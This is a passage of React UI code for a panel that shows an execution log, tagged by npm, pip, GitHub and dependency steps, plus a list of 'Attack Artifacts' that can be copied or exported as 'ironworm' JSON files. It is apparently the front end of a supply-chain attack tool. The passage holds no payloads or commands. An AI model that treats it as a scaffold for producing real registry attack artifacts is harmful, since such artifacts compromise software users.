              <div className="text-[9px] text-zinc-600 mt-0.5">{selected.category} · {selected.registry} · {selected.variant}</div>
            </div>

            <div className="p-4 space-y-4 flex-1">
              {selected.steps.length > 0 && (
                <div>
                  <div className="text-[9px] text-zinc-600 uppercase tracking-widest mb-1.5">Execution Log</div>
                  <div className="bg-black/60 border border-zinc-800 p-3 max-h-40 overflow-y-auto space-y-0.5">
                    {selected.steps.map((s, i) => (
                      <div key={i} className={`text-[9px] font-mono leading-relaxed ${s.includes("[!]") || s.includes("FREE") ? "text-red-400" : s.includes("[dep]") ? "text-orange-400" : s.includes("[npm]") ? "text-yellow-400" : s.includes("[pip]") ? "text-blue-400" : s.includes("[github]") ? "text-purple-400" : "text-zinc-500"}`}>{s}</div>
                    ))}
                  </div>
                </div>
              )}

              {selected.artifacts.length > 0 && (
                <div>
                  <div className="text-[9px] text-zinc-600 uppercase tracking-widest mb-1.5">Attack Artifacts ({selected.artifacts.length})</div>
                  <div className="space-y-2">
                    {selected.artifacts.map((a, i) => (
                      <Artifact key={i} label={a.label} content={a.content} />
                    ))}
                  </div>
                </div>
              )}

              <div className="flex gap-2 pt-1">
                <button onClick={() => navigator.clipboard.writeText(selected.artifacts.map(a => `# ${a.label}\n${a.content}`).join("\n\n---\n\n"))}
                  className="flex-1 py-2 text-[9px] uppercase tracking-widest border border-zinc-800 hover:border-zinc-600 text-zinc-600 hover:text-zinc-300 transition-all">
                  Copy All
                </button>
                <button onClick={() => {
                  const blob = new Blob([JSON.stringify(selected, null, 2)], { type: "application/json" });
                  const a = document.createElement("a");
                  a.href = URL.createObjectURL(blob);
                  a.download = `ironworm_${selected.id}.json`;
                  a.click();
                  URL.revokeObjectURL(a.href);
                }}
                  className="py-2 px-3 text-[9px] uppercase tracking-widest border border-zinc-800 hover:border-zinc-600 text-zinc-600 hover:text-zinc-300 transition-all">
                  JSON
                </button>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
